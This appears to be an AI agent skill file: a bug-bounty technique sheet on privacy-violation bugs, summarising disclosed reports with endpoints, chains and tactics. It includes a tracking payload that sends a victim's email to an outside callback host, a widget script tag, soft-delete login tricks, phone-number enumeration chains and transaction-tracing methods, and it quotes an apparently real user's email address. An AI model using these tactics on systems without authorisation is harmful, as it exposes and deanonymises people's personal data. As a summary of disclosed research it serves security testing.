---
name: hunter-l3-privacy-violation
description: "Use when hunting Privacy Violation on a target. Loads the L3 technique sheet: Privacy Violation bugs are cases where a product exposes, retains, or mishandles user data in a way that contradicts the user's stated privacy expectations — deleted content still accessible, \"anonymo"
domain: cybersecurity
subdomain: web
tags:
- web
- privacy-violation
- hunting
- l3
version: '1.0'
---

# Privacy Violation — Technique Sheet

## Overview
Privacy Violation bugs are cases where a product exposes, retains, or mishandles user data in a way that contradicts the user's stated privacy expectations — deleted content still accessible, "anonymous" data deanonymizable, secret settings bypassed, or personal data (phone numbers, emails, GPS, avatars) leaked through predictable flows. They pay across web, mobile, email, and even protocol-level programs; the key is proving that a real user's data crossed a boundary the product promised it wouldn't. Many of the highest-signal reports here didn't need exotic payloads at all — they needed a careful reading of what a "delete", "hide", "secret", or "disable" setting actually does end-to-end.

## Distinct sub-patterns

### 1. Deleted content / deleted accounts remain accessible
- Endpoint shape: `GET /poll/{id}` (X/XAI); account login on `ucp.nordvpn.com` `POST /login` with `email` param; account re-registration flow (Semmle/lgtm).
- Payload: on Nord, login email was `vainrunney30@protonmail.com.deleted` — deletion merely appended `.deleted` to the stored email; the account and full billing history remained intact with the original password. On Semmle, "payload not stated": delete `email1` account, re-register as `email2`, and find `email1` still attached without re-confirmation.
- Root cause: deletion implemented as a flag/soft-delete rather than data removal; or content is unlinked from the UI but left addressable by direct URL (deleted X poll accessible past the 30-day policy window).
- Impact: post-deletion full account + billing access (Nord); PII retention across re-registration without re-verification (Semmle); deleted poll content readable by anyone (X/XAI).
- Exemplars: 813421 (Nord), 386596 (Semmle), 1015373 (X/XAI).

### 2. Metadata not stripped from user-supplied media
- Endpoint shape: `GET /{filename}.png` on i.redd.it.
- Payload: payload not stated — upload an HEIC/HEIF image, then inspect the converted PNG's EXIF.
- Root cause: the HEIC→PNG conversion pipeline failed to strip EXIF GPS metadata before serving the image publicly.
- Impact: GPS EXIF retained on publicly served images; a real third-party user's location was recovered in the wild.
- Exemplar: 1069039 (Reddit).

### 3. Pre-acceptance leakage in friend/search APIs
- Endpoint shape: `POST /UserPublicFriends`, `POST /FriendRequestCreate` with `username` param.
- Payload: payload not stated.
- Root cause: friend-request/search API returns the target's phone number and friend list before the request is accepted.
- Impact: with only a username, attacker got the target's full friends list plus their phone number — enabling phone-number harvesting and spear-phishing.
- Chain: enumerate friends via /UserPublicFriends → pick a friend's username → send a friend request → response leaks the target's phone number.
- Exemplar: 1245741 (Zenly).

### 4. Production data leaking into staging / notification emails
- Endpoint shape: n/a — a staging notification email (HackerOne: `no-reply+staging@hackerone.com`, links to `enorekcah.com`); VK notification emails containing a link/token that reveals the email bound to the account.
- Payload: payload not stated for both.
- Root cause: production user/hacker data copied into staging and used to generate test emails; VK emails embed a token that exposes the bound email to anyone who can read the mail.
- Impact: real production data delivered via staging email; email-address disclosure after single-email compromise ($100, VK).
- Exemplars: 1392511 (HackerOne), 223172 (VK).

### 5. Anonymous identity deanonymization via secondary surfaces
- Endpoint shape: `GET /{blog}/post/{id}` (notes view); `GET /{account_name}/patrons/export.csv` with `patron_avatar_url` field.
- Payload: payload not stated for both.
- Root cause: Tumblr's notes view exposed the anonymous tipper's primary blog avatar; Liberapay's patron export included `patron_avatar_url` even for donations flagged 'Secret'.
- Impact: a blog leaving an anonymous tip was deanonymized via its avatar; secret donors deanonymizable via reverse image search on the avatar URL.
- Exemplars: 1484168 (Automattic), 2286764 (Liberapay).

### 6. Privacy settings bypassed via alternate rendering surfaces
- Endpoint shape: `GET /~demo/widgets/` with `data-gratipay-username` param.
- Payload (verbatim): `<script data-gratipay-username="demo" data-gratipay-widget="giving" src="//grtp.co/v1.js"></script>`
- Root cause: embeddable widgets bypass the user's hide-giving/hide-from-search privacy settings.
- Impact: a user's total giving/taking amounts exposed on an external site even after enabling hide-total-giving and hide-from-search.
- Exemplar: 262088 (Gratipay).

### 7. Remote consent / presence-state failures in real-time media
- Endpoint shape: Nextcloud Talk call moderation API; `nextcloud/spreed` WebRTC video track.
- Payload: payload not stated.
- Root cause: (a) removing then re-granting call permissions silently re-enables a participant's camera/mic remotely without consent; (b) disabling video doesn't send a black frame — the last video frame keeps being sent (CVE-2022-39212).
- Impact: a moderator can remotely reactivate a participant's webcam/microphone; the last pre-disable video frame remains viewable by other participants on the received track.
- Exemplars: 1520685 and 1641088 (Nextcloud).

### 8. Untrusted node / proxy trust misclassification (protocol level)
- Endpoint shape: `get_outs.bin` RPC on a Monero remote node (param `gidx`); `monero-wallet-cli --daemon-address {onion}:{port}` under torsocks/proxychains.
- Payload: payload not stated.
- Root cause: (a) the client cannot authenticate `get_outs.bin` responses and retries re-sample new mixin sets on error, letting a malicious node intersect request sets to isolate the real spend; (b) `is_local_address` returns true for proxied onion addresses, marking a remote node as trusted — so `rescan_bc` (trusted-only) runs against an untrusted node.
- Impact: PoC proved 10/10 trials tracing transaction inputs and breaking untraceability; private-data disclosure to a remote node. On-path adversaries can do the same.
- Chains: bogus `get_outs.bin` → client retries with new mixins → node intersects the two request sets to find the real output; guess-and-check variant.
- Exemplars: 304770, 361269 (Monero).

### 9. Sanitizer allowlist gaps enabling tracking pixels
- Endpoint shape: roundcube HTML sanitizer (`rcube_washtml`), param `feImage href`.
- Payload (verbatim): `<feImage href="https://httpbin.org/image/svg?email=victim@test.com" width="1" height="1"/>`
- Root cause: `<feImage>` was allowlisted but its `href` wasn't treated as an image source, so external URLs passed `wash_link()` even with `allow_remote=false`.
- Impact: outbound HTTP request on email open → open/read tracking, IP disclosure, UA fingerprinting despite "Block remote images" being enabled.
- Exemplar: 3486747 (Nextcloud).

### 10. Over-broad permission scoping exposing other users' data
- Endpoint shape: steamcommunity.com GetReports on a game hub.
- Payload: payload not stated.
- Root cause: admin permissions on one game hub were not scoped; the reports endpoint returned UGC reports for hubs the user lacked access to.
- Impact: cross-game UGC report access ($750).
- Exemplar: 350937 (Valve).

### 11. Telemetry/analytics data leaks via third-party SDKs and keys
- Endpoint shape: iOS app event analytics (NordVPN); `com.nordvpn.android` Google Play GAID integration.
- Payload: payload not stated.
- Root cause: usage-event data sent to a third-party service with a reused API key where GET was allowed; connection events carried non-anonymized user IDs; GAID integration implemented incorrectly.
- Impact: app event data retrievable via the reused key — NordVPN disabled GET for keys, removed the SDK, and deleted all previously-sent data; non-anonymized connection events and GAID mishandling remediated.
- Exemplars: 752402, 781238, 803941 (Nord Security).

### 12. Recovery flows leaking the bound identifier
- Endpoint shape: VK password recovery form.
- Payload: payload not stated.
- Root cause: the recovery flow reveals the full phone number bound to the account instead of masking it.
- Impact: another user's complete phone number (all digits) obtained.
- Exemplar: 350939 (VK).

## Bypass / chain notes
- Soft-delete bypass: appended-suffix emails (`.deleted`) authenticate as live accounts (813421) — try `email+.deleted`, and check whether re-registered accounts inherit the deleted email unconfirmed (386596).
- Enumerate-then-leak chain: a public listing surface (friends list) feeds a secondary flow (friend request) that returns the PII (1245744-style chain in 1245741).
- Retry-and-intersect: for non-authenticated RPC responses, forcing retries and intersecting response sets isolates the real item (304770); works also for on-path adversaries.
- Trust-confusion via proxying: torsocks/proxychains flip onion addresses into "local/trusted" (361269) — always test trusted-only commands against proxied remote endpoints.
- Secondary render surface as settings bypass: widgets/exports/notes views often skip the permission checks the main UI enforces (262088, 2286764, 1484168).
- Allowlist smuggling: an allowlisted tag whose URL attributes aren't classified as image sources routes external fetches past remote-content blocking (3486747).

## Gotchas / what NOT to do
- Don't assume the UI is the whole surface: exports (CSV), widgets, notes views, and email notifications frequently re-serve data with different permission logic.
- "Deleted" rarely means deleted — test login with suffixed emails, direct URLs past the retention window, and re-registration with old emails.
- Check media conversion pipelines, not just original uploads: metadata may be stripped for one format and not the converted one (HEIC→PNG).
- Anonymization claims deserve byte-level checks: "non-anonymized" IDs in telemetry may not be directly re-identifiable — Nord's report was accepted because the data wasn't anonymized, not because full deanonymization was proven (781238).
- For sanitizer bugs, verify with an observable callback (httpbin/attacker host) before reporting — the payload must fire with remote-content blocking enabled.
- Mobile telemetry reports depend on the program's scope for third-party SDKs and GAID handling; Nord accepted all three, but frame the impact as user-data exposure, not "SDK exists".

## Real-world impact examples
- Reddit (1069039): a real third-party user's GPS location recovered from a public i.redd.it PNG.
- Zenly (1245741): phone number + full friends list of any user from just their username — direct spear-phishing enabler.
- Nord Security (813421): account supposedly deleted via support was fully accessible (including complete billing history) by logging in with `email+.deleted`.
- Nord Security (752402): third-party analytics event data retrievable via a reused API key; vendor deleted all previously-sent data.
- Monero (304770): 10/10 PoC success tracing the real spent output, defeating untraceability on untrusted remote nodes.
- Liberapay (2286764): "Secret" donations deanonymizable via `patron_avatar_url` + reverse image search.
- Valve (350937): cross-hub UGC report access, $750 bounty.
- Nextcloud (1641088): last video frame leaks to other call participants after video "disable" — CVE-2022-39212.